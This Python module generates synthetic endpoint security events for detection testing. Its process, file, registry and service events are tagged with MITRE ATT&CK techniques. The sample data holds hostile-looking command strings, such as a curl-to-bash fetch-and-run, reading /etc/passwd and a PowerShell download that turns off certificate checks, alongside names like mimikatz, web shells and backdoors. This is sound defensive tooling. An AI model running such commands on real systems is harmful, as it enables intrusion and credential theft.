"""
Endpoint Event Generator Module

This module provides the EndpointEventGenerator class for generating endpoint security events.
"""

import random
import os
from typing import Dict, Any
from .base_generator import BaseEventGenerator

class EndpointEventGenerator(BaseEventGenerator):
    """Generator for endpoint security events."""
    
    def generate_event(self) -> Dict[str, Any]:
        """
        Generate an endpoint security event.
        
        Returns:
            Endpoint event data
        """
        # Select a random event type
        event_types = [
            self._generate_process_event,
            self._generate_file_event,
            self._generate_registry_event,
            self._generate_authentication_event,
            self._generate_service_event
        ]
        
        generator = random.choice(event_types)
        return generator()
    
    def _generate_process_event(self) -> Dict[str, Any]:
        """
        Generate a process creation/termination event.
        
        Returns:
            Process event data
        """
        host = self._get_random_host()
        if not host:
            return {}
        
        # Create base event
        event = self._create_base_event()
        
        # Get OS information
        os_info = host.get_attribute("os", {})
        os_name = os_info.get("name", "Windows")
        
        # Generate process information based on OS
        if os_name == "Windows":
            processes = [
                {"name": "cmd.exe", "path": "C:\\Windows\\System32\\cmd.exe", "suspicious": True},
                {"name": "powershell.exe", "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "suspicious": True},
                {"name": "explorer.exe", "path": "C:\\Windows\\explorer.exe", "suspicious": False},
                {"name": "svchost.exe", "path": "C:\\Windows\\System32\\svchost.exe", "suspicious": False},
                {"name": "rundll32.exe", "path": "C:\\Windows\\System32\\rundll32.exe", "suspicious": True},
                {"name": "regsvr32.exe", "path": "C:\\Windows\\System32\\regsvr32.exe", "suspicious": True},
                {"name": "msiexec.exe", "path": "C:\\Windows\\System32\\msiexec.exe", "suspicious": True},
                {"name": "notepad.exe", "path": "C:\\Windows\\System32\\notepad.exe", "suspicious": False},
                {"name": "chrome.exe", "path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "suspicious": False},
                {"name": "firefox.exe", "path": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "suspicious": False}
            ]
            
            suspicious_processes = [
                {"name": "mimikatz.exe", "path": "C:\\Users\\Admin\\Downloads\\mimikatz.exe", "suspicious": True},
                {"name": "psexec.exe", "path": "C:\\Users\\Admin\\Downloads\\psexec.exe", "suspicious": True},
                {"name": "netcat.exe", "path": "C:\\Users\\Admin\\Downloads\\nc.exe", "suspicious": True},
                {"name": "winrar.exe", "path": "C:\\Program Files\\WinRAR\\winrar.exe", "suspicious": False},
                {"name": "putty.exe", "path": "C:\\Program Files\\PuTTY\\putty.exe", "suspicious": False}
            ]
        else:  # Linux/macOS
            processes = [
                {"name": "bash", "path": "/bin/bash", "suspicious": False},
                {"name": "sh", "path": "/bin/sh", "suspicious": False},
                {"name": "python", "path": "/usr/bin/python", "suspicious": False},
                {"name": "python3", "path": "/usr/bin/python3", "suspicious": False},
                {"name": "ls", "path": "/bin/ls", "suspicious": False},
                {"name": "ps", "path": "/bin/ps", "suspicious": False},
                {"name": "grep", "path": "/bin/grep", "suspicious": False},
                {"name": "find", "path": "/usr/bin/find", "suspicious": False},
                {"name": "cat", "path": "/bin/cat", "suspicious": False},
                {"name": "ssh", "path": "/usr/bin/ssh", "suspicious": False}
            ]
            
            suspicious_processes = [
                {"name": "nc", "path": "/usr/bin/nc", "suspicious": True},
                {"name": "nmap", "path": "/usr/bin/nmap", "suspicious": True},
                {"name": "wget", "path": "/usr/bin/wget", "suspicious": False},
                {"name": "curl", "path": "/usr/bin/curl", "suspicious": False},
                {"name": "chmod", "path": "/bin/chmod", "suspicious": False}
            ]
        
        # Determine if this should be a suspicious process (10% chance)
        is_suspicious = random.random() < 0.1
        process_list = suspicious_processes if is_suspicious else processes
        process = random.choice(process_list)
        
        # Generate command line arguments
        command_args = ""
        if process["name"] == "cmd.exe":
            command_args = random.choice([
                "/c echo Hello",
                "/c dir C:\\",
                "/c type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "/c net user",
                "/c net localgroup administrators"
            ])
        elif process["name"] == "powershell.exe":
            command_args = random.choice([
                "-Command Get-Process",
                "-Command Get-Service",
                "-Command Get-WmiObject Win32_ComputerSystem",
                "-Command Invoke-WebRequest -Uri http://example.com -OutFile C:\\temp\\file.txt",
                "-Command [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $client = New-Object Net.WebClient; $client.DownloadString('https://example.com')"
            ])
        elif process["name"] == "bash" or process["name"] == "sh":
            command_args = random.choice([
                "-c 'ls -la'",
                "-c 'ps aux'",
                "-c 'cat /etc/passwd'",
                "-c 'find / -name \"*.conf\" -type f 2>/dev/null'",
                "-c 'curl -s http://example.com | bash'"
            ])
        
        # Generate parent process
        parent_process = random.choice(processes)
        
        # Add event-specific data
        event.update({
            "event_type": "process",
            "entity": host.get_id(),
            "entity_type": "host",
            "action": random.choice(["created", "terminated"]),
            "process_name": process["name"],
            "process_path": process["path"],
            "process_id": random.randint(1000, 65535),
            "parent_process_name": parent_process["name"],
            "parent_process_path": parent_process["path"],
            "parent_process_id": random.randint(1000, 65535),
            "user": random.choice([user_id for user_id in self.entities.keys() if user_id.startswith("user")]),
            "command_line": f"{process['path']} {command_args}" if command_args else process["path"]
        })
        
        # Add suspicious information if applicable
        if process["suspicious"] or is_suspicious:
            event["severity"] = random.choice(["Medium", "High"])
            event["suspicious"] = True
            event["reason"] = random.choice([
                "suspicious process name",
                "suspicious process path",
                "suspicious command line arguments",
                "unusual parent process",
                "process running as unexpected user"
            ])
            
            # Add MITRE ATT&CK mapping
            technique_ids = []
            
            if "cmd.exe" in event["process_name"] or "powershell.exe" in event["process_name"]:
                technique_ids.append('T1059.003')  # Command and Scripting Interpreter: Windows Command Shell
            elif "bash" in event["process_name"] or "sh" in event["process_name"]:
                technique_ids.append('T1059.004')  # Command and Scripting Interpreter: Unix Shell
            elif "python" in event["process_name"]:
                technique_ids.append('T1059.006')  # Command and Scripting Interpreter: Python
            
            if "mimikatz" in event["process_name"]:
                technique_ids.append('T1003')  # OS Credential Dumping
            elif "psexec" in event["process_name"]:
                technique_ids.append('T1021.002')  # Remote Services: SMB/Windows Admin Shares
            elif "netcat" in event["process_name"] or "nc" in event["process_name"]:
                technique_ids.append('T1071.001')  # Application Layer Protocol: Web Protocols
            
            if not technique_ids:
                technique_ids.append('T1204')  # User Execution
            
            self._add_mitre_attack_mapping(event, technique_ids)
        
        return event
    
    def _generate_file_event(self) -> Dict[str, Any]:
        """
        Generate a file creation/modification/deletion event.
        
        Returns:
            File event data
        """
        host = self._get_random_host()
        if not host:
            return {}
        
        # Create base event
        event = self._create_base_event()
        
        # Get OS information
        os_info = host.get_attribute("os", {})
        os_name = os_info.get("name", "Windows")
        
        # Generate file information based on OS
        if os_name == "Windows":
            files = [
                {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts", "suspicious": False},
                {"path": "C:\\Windows\\System32\\config\\SAM", "suspicious": True},
                {"path": "C:\\Users\\Administrator\\Documents\\report.docx", "suspicious": False},
                {"path": "C:\\Program Files\\Example\\config.ini", "suspicious": False},
                {"path": "C:\\Windows\\Temp\\log.txt", "suspicious": False}
            ]
            
            suspicious_files = [
                {"path": "C:\\Windows\\System32\\svchost.dll", "suspicious": True},
                {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts.bak", "suspicious": True},
                {"path": "C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe", "suspicious": True},
                {"path": "C:\\Users\\Public\\Documents\\data.zip", "suspicious": True},
                {"path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\evil.ps1", "suspicious": True}
            ]
        else:  # Linux/macOS
            files = [
                {"path": "/etc/passwd", "suspicious": False},
                {"path": "/etc/shadow", "suspicious": True},
                {"path": "/home/user/Documents/report.pdf", "suspicious": False},
                {"path": "/etc/ssh/sshd_config", "suspicious": False},
                {"path": "/var/log/auth.log", "suspicious": False}
            ]
            
            suspicious_files = [
                {"path": "/etc/cron.d/backdoor", "suspicious": True},
                {"path": "/tmp/.hidden", "suspicious": True},
                {"path": "/home/user/.ssh/authorized_keys.bak", "suspicious": True},
                {"path": "/var/www/html/shell.php", "suspicious": True},
                {"path": "/usr/local/bin/sshd", "suspicious": True}
            ]
        
        # Determine if this should be a suspicious file (10% chance)
        is_suspicious = random.random() < 0.1
        file_list = suspicious_files if is_suspicious else files
        file = random.choice(file_list)
        
        # Generate file action
        actions = ["created", "modified", "deleted", "renamed", "permission_changed"]
        action = random.choice(actions)
        
        # Add event-specific data
        event.update({
            "event_type": "file",
            "entity": host.get_id(),
            "entity_type": "host",
            "action": action,
            "file_path": file["path"],
            "file_name": os.path.basename(file["path"]),
            "file_extension": os.path.splitext(file["path"])[1],
            "user": random.choice([user_id for user_id in self.entities.keys() if user_id.startswith("user")]),
            "process_name": random.choice(["explorer.exe", "cmd.exe", "powershell.exe", "bash", "sh", "python"]),
            "process_id": random.randint(1000, 65535)
        })
        
        # Add additional action-specific data
        if action == "renamed":
            event["old_file_path"] = file["path"]
            event["new_file_path"] = f"{os.path.splitext(file['path'])[0]}_new{os.path.splitext(file['path'])[1]}"
        elif action == "permission_changed":
            event["old_permissions"] = "0644" if os_name != "Windows" else "RW-R--R--"
            event["new_permissions"] = "0777" if os_name != "Windows" else "RW-RW-RW-"
        
        # Add suspicious information if applicable
        if file["suspicious"] or is_suspicious:
            event["severity"] = random.choice(["Medium", "High"])
            event["suspicious"] = True
            event["reason"] = random.choice([
                "suspicious file path",
                "sensitive file accessed",
                "unusual file operation",
                "unusual file permissions",
                "unusual process accessing file"
            ])
            
            # Add MITRE ATT&CK mapping
            technique_ids = []
            
            if "shadow" in file["path"] or "SAM" in file["path"]:
                technique_ids.append('T1003')  # OS Credential Dumping
            elif "Startup" in file["path"] or "cron.d" in file["path"]:
                technique_ids.append('T1547')  # Boot or Logon Autostart Execution
            elif ".ssh" in file["path"]:
                technique_ids.append('T1098')  # Account Manipulation
            elif "shell.php" in file["path"] or "backdoor" in file["path"]:
                technique_ids.append('T1505.003')  # Server Software Component: Web Shell
            elif "hosts" in file["path"]:
                technique_ids.append('T1565.001')  # Data Manipulation: Stored Data Manipulation
            
            if not technique_ids:
                if action == "created":
                    technique_ids.append('T1105')  # Ingress Tool Transfer
                elif action == "modified":
                    technique_ids.append('T1565.001')  # Data Manipulation: Stored Data Manipulation
                elif action == "deleted":
                    technique_ids.append('T1070.004')  # Indicator Removal on Host: File Deletion
            
            self._add_mitre_attack_mapping(event, technique_ids)
        
        return event
    
    def _generate_registry_event(self) -> Dict[str, Any]:
        """
        Generate a registry event (Windows only).
        
        Returns:
            Registry event data
        """
        host = self._get_random_host()
        if not host:
            return {}
        
        # Create base event
        event = self._create_base_event()
        
        # Get OS information
        os_info = host.get_attribute("os", {})
        os_name = os_info.get("name", "Windows")
        
        # Skip if not Windows
        if os_name != "Windows":
            return self._generate_process_event()  # Fallback to process event
        
        # Registry keys
        registry_keys = [
            {"key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "suspicious": True},
            {"key": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "suspicious": True},
            {"key": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services", "suspicious": True},
            {"key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "suspicious": True},
            {"key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "suspicious": False},
            {"key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "suspicious": False},
            {"key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", "suspicious": False},
            {"key": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "suspicious": False},
            {"key": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender", "suspicious": True},
            {"key": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "suspicious": True}
        ]
        
        # Registry actions
        actions = ["created", "modified", "deleted"]
        action = random.choice(actions)
        
        # Select registry key
        registry_key = random.choice(registry_keys)
        
        # Generate value name and data
        value_names = [
            "AutoStart", "Shell", "UserInit", "Userinit", "Debugger", "EnableLUA", 
            "ConsentPromptBehaviorAdmin", "DisableAntiSpyware", "Start", "ProxyEnable", 
            "ProxyServer", "HideFileExt", "Hidden"
        ]
        
        value_name = random.choice(value_names)
        
        value_data_types = ["REG_SZ", "REG_DWORD", "REG_BINARY", "REG_EXPAND_SZ", "REG_MULTI_SZ"]
        value_data_type = random.choice(value_data_types)
        
        if value_data_type == "REG_SZ" or value_data_type == "REG_EXPAND_SZ":
            if registry_key["suspicious"] and random.random() < 0.5:
                value_data = random.choice([
                    "C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand ...",
                    "C:\\Users\\Admin\\Downloads\\malware.exe",
                    "rundll32.exe C:\\Windows\\System32\\shell32.dll,ShellExec_RunDLL C:\\malicious.js",
                    "wscript.exe C:\\Windows\\System32\\Tasks\\update.vbs",
                    "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe"
                ])
            else:
                value_data = random.choice([
                    "C:\\Program Files\\Example\\example.exe",
                    "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                    "C:\\Windows\\explorer.exe",
                    "C:\\Program Files\\Internet Explorer\\iexplore.exe",
                    "%PROGRAMFILES%\\Common Files\\Microsoft Shared\\Windows Live\\WLIDSVC.EXE"
                ])
        elif value_data_type == "REG_DWORD":
            value_data = str(random.randint(0, 1))
        else:
            value_data = "binary_data"
        
        # Add event-specific data
        event.update({
            "event_type": "registry",
            "entity": host.get_id(),
            "entity_type": "host",
            "action": action,
            "registry_key": registry_key["key"],
            "registry_value_name": value_name,
            "registry_value_data": value_data,
            "registry_value_type": value_data_type,
            "user": random.choice([user_id for user_id in self.entities.keys() if user_id.startswith("user")]),
            "process_name": random.choice(["regedit.exe", "cmd.exe", "powershell.exe", "explorer.exe"]),
            "process_id": random.randint(1000, 65535)
        })
        
        # Add suspicious information if applicable
        if registry_key["suspicious"] or ("malware" in value_data or "backdoor" in value_data):
            event["severity"] = random.choice(["Medium", "High"])
            event["suspicious"] = True
            event["reason"] = random.choice([
                "modification to autostart registry key",
                "suspicious registry value data",
                "modification to security settings",
                "modification to service configuration",
                "modification to Windows Defender settings"
            ])
            
            # Add MITRE ATT&CK mapping
            technique_ids = []
            
            if "Run" in registry_key["key"]:
                technique_ids.append('T1547.001')  # Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
            elif "Services" in registry_key["key"]:
                technique_ids.append('T1543.003')  # Create or Modify System Process: Windows Service
            elif "Winlogon" in registry_key["key"]:
                technique_ids.append('T1547.004')  # Boot or Logon Autostart Execution: Winlogon Helper DLL
            elif "Windows Defender" in registry_key["key"]:
                technique_ids.append('T1562.001')  # Impair Defenses: Disable or Modify Tools
            elif "Terminal Server" in registry_key["key"]:
                technique_ids.append('T1021.001')  # Remote Services: Remote Desktop Protocol
            
            if not technique_ids:
                technique_ids.append('T1112')  # Modify Registry
            
            self._add_mitre_attack_mapping(event, technique_ids)
        
        return event
    
    def _generate_authentication_event(self) -> Dict[str, Any]:
        """
        Generate an authentication event.
        
        Returns:
            Authentication event data
        """
        host = self._get_random_host()
        user = self._get_random_user()
        
        if not host or not user:
            return {}
        
        # Create base event
        event = self._create_base_event()
        
        # Get OS information
        os_info = host.get_attribute("os", {})
        os_name = os_info.get("name", "Windows")
        
        # Authentication types
        if os_name == "Windows":
            auth_types = ["NTLM", "Kerberos", "Local", "Remote Desktop", "Network"]
        else:  # Linux/macOS
            auth_types = ["Password", "SSH Key", "sudo", "su", "PAM"]
        
        auth_type = random.choice(auth_types)
        
        # Authentication status
        statuses = ["success", "failure"]
        weights = [0.8, 0.2]  # 80% success, 20% failure
        status = random.choices(statuses, weights=weights, k=1)[0]
        
        # Failure reasons
        failure_reasons = [
            "invalid_credentials",
            "account_locked",
            "account_expired",
            "password_expired",
            "time_restriction",
            "workstation_restriction"
        ]
        
        # Add event-specific data
        event.update({
            "event_type": "authentication",
            "entity": host.get_id(),
            "entity_type": "host",
            "user": user.get_id(),
            "user_name": user.get_attribute("username"),
            "authentication_type": auth_type,
            "authentication_status": status,
            "source_ip": random.choice([
                host.get_attribute("ip_address"),
                "192.168.1." + str(random.randint(2, 254)),
                "10.0.0." + str(random.randint(2, 254))
            ]),
            "source_hostname": random.choice([
                host.get_attribute("hostname"),
                "workstation-" + str(random.randint(1, 20)),
                "laptop-" + str(random.randint(1, 10))
            ])
        })
        
        # Add failure reason if authentication failed
        if status == "failure":
            event["failure_reason"] = random.choice(failure_reasons)
        
        # Add suspicious information for failed authentications or unusual sources
        if status == "failure" or random.random() < 0.1:
            event["severity"] = random.choice(["Medium", "High"])
            event["suspicious"] = True
            
            if status == "failure":
                event["reason"] = f"authentication failure: {event.get('failure_reason', 'unknown')}"
                
                # Update user state
                user.simulate_failed_login()
            else:
                event["reason"] = random.choice([
                    "authentication from unusual source",
                    "authentication at unusual time",
                    "authentication for sensitive account",
                    "multiple authentication attempts"
                ])
            
            # Add MITRE ATT&CK mapping
            technique_ids = []
            
            if status == "failure" and event.get("failure_reason") == "invalid_credentials":
                technique_ids.append('T1110')  # Brute Force
            elif "Remote Desktop" in auth_type:
                technique_ids.append('T1021.001')  # Remote Services: Remote Desktop Protocol
            elif "SSH" in auth_type:
                technique_ids.append('T1021.004')  # Remote Services: SSH
            else:
                technique_ids.append('T1078')  # Valid Accounts
            
            self._add_mitre_attack_mapping(event, technique_ids)
        else:
            # Update user state for successful login
            user.simulate_login()
        
        return event
    
    def _generate_service_event(self) -> Dict[str, Any]:
        """
        Generate a service event.
        
        Returns:
            Service event data
        """
        host = self._get_random_host()
        if not host:
            return {}
        
        # Create base event
        event = self._create_base_event()
        
        # Get OS information
        os_info = host.get_attribute("os", {})
        os_name = os_info.get("name", "Windows")
        
        # Service information based on OS
        if os_name == "Windows":
            services = [
                {"name": "wuauserv", "display_name": "Windows Update", "suspicious": False},
                {"name": "Dnscache", "display_name": "DNS Client", "suspicious": False},
                {"name": "LanmanServer", "display_name": "Server", "suspicious": False},
                {"name": "Schedule", "display_name": "Task Scheduler", "suspicious": False},
                {"name": "W3SVC", "display_name": "World Wide Web Publishing Service", "suspicious": False}
            ]
            
            suspicious_services = [
                {"name": "RemoteAccess", "display_name": "Routing and Remote Access", "suspicious": True},
                {"name": "TermService", "display_name": "Remote Desktop Services", "suspicious": True},
                {"name": "RemoteRegistry", "display_name": "Remote Registry", "suspicious": True},
                {"name": "SvcUpdate", "display_name": "System Update Service", "suspicious": True},
                {"name": "WinDefend", "display_name": "Windows Defender Service", "suspicious": True}
            ]
        else:  # Linux/macOS
            services = [
                {"name": "sshd", "display_name": "OpenSSH Server", "suspicious": False},
                {"name": "apache2", "display_name": "Apache HTTP Server", "suspicious": False},
                {"name": "mysql", "display_name": "MySQL Database Server", "suspicious": False},
                {"name": "cron", "display_name": "Cron Daemon", "suspicious": False},
                {"name": "rsyslog", "display_name": "System Logging Service", "suspicious": False}
            ]
            
            suspicious_services = [
                {"name": "netcat", "display_name": "Netcat Listener", "suspicious": True},
                {"name": "telnetd", "display_name": "Telnet Server", "suspicious": True},
                {"name": "rshd", "display_name": "Remote Shell Daemon", "suspicious": True},
                {"name": "backdoor", "display_name": "System Update Service", "suspicious": True},
                {"name": "cryptominer", "display_name": "System Resource Manager", "suspicious": True}
            ]
        
        # Determine if this should be a suspicious service (10% chance)
        is_suspicious = random.random() < 0.1
        service_list = suspicious_services if is_suspicious else services
        service = random.choice(service_list)
        
        # Service actions
        actions = ["installed", "started", "stopped", "modified", "deleted"]
        action = random.choice(actions)
        
        # Add event-specific data
        event.update({
            "event_type": "service",
            "entity": host.get_id(),
            "entity_type": "host",
            "action": action,
            "service_name": service["name"],
            "service_display_name": service["display_name"],
            "service_type": random.choice(["kernel", "file_system", "adapter", "recognizer", "own_process", "share_process"]),
            "service_start_type": random.choice(["boot", "system", "auto", "demand", "disabled"]),
            "user": random.choice([user_id for user_id in self.entities.keys() if user_id.startswith("user")]),
            "process_name": random.choice(["services.exe", "sc.exe", "cmd.exe", "powershell.exe", "systemctl", "service"]),
            "process_id": random.randint(1000, 65535)
        })
        
        # Add binary path for installed or modified services
        if action in ["installed", "modified"]:
            if os_name == "Windows":
                if service["suspicious"]:
                    event["binary_path"] = random.choice([
                        "C:\\Windows\\Temp\\svchost.exe",
                        "C:\\Users\\Administrator\\AppData\\Local\\Temp\\update.exe",
                        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\service.exe",
                        "C:\\Windows\\System32\\cmd.exe /c powershell.exe -EncodedCommand ...",
                        "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\Temp\\evil.dll,DllMain"
                    ])
                else:
                    event["binary_path"] = f"C:\\Windows\\System32\\{service['name']}.exe"
            else:  # Linux/macOS
                if service["suspicious"]:
                    event["binary_path"] = random.choice([
                        "/tmp/.hidden/backdoor",
                        "/var/tmp/update",
                        "/usr/local/bin/service",
                        "/home/user/.local/bin/daemon",
                        "/opt/update/bin/service"
                    ])
                else:
                    event["binary_path"] = f"/usr/sbin/{service['name']}"
        
        # Add suspicious information if applicable
        if service["suspicious"] or is_suspicious:
            event["severity"] = random.choice(["Medium", "High"])
            event["suspicious"] = True
            
            if action == "installed":
                event["reason"] = "suspicious service installed"
            elif action == "started":
                event["reason"] = "suspicious service started"
            elif action == "modified":
                event["reason"] = "service modified with suspicious binary path"
            elif action == "stopped":
                event["reason"] = "critical service stopped"
            elif action == "deleted":
                event["reason"] = "service deleted"
            
            # Add MITRE ATT&CK mapping
            technique_ids = []
            
            if service["name"] in ["RemoteAccess", "TermService", "sshd", "telnetd"]:
                technique_ids.append('T1021')  # Remote Services
            elif "Registry" in service["name"]:
                technique_ids.append('T1112')  # Modify Registry
            elif "WinDefend" in service["name"]:
                technique_ids.append('T1562.001')  # Impair Defenses: Disable or Modify Tools
            elif "backdoor" in service["name"].lower() or "cryptominer" in service["name"].lower():
                technique_ids.append('T1543')  # Create or Modify System Process
            
            if not technique_ids:
                if action in ["installed", "modified"]:
                    technique_ids.append('T1543')  # Create or Modify System Process
                elif action == "stopped" or action == "deleted":
                    technique_ids.append('T1489')  # Service Stop
            
            self._add_mitre_attack_mapping(event, technique_ids)
        
        return event
